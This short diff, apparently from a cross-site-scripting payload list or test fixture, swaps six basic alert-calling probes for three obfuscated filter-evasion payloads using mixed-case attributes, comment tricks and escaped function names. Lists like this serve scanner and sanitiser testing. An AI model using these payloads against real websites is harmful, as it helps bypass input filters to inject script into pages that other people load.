@@ -1,6 +1,3 @@
-<script>alert(123)</script>
-&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;
-\><svg onload="alert(0)">
-<img src=x onerror=alert(123) />
-<svg onload="alert(/x/)">
-<audio src=1 onerror=alert(1)>
+"\"><imG/sRc=l oNerrOr=(prompt)() x>",
+"<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>",
+"<deTails oNToggle=confi\u0072m()>",
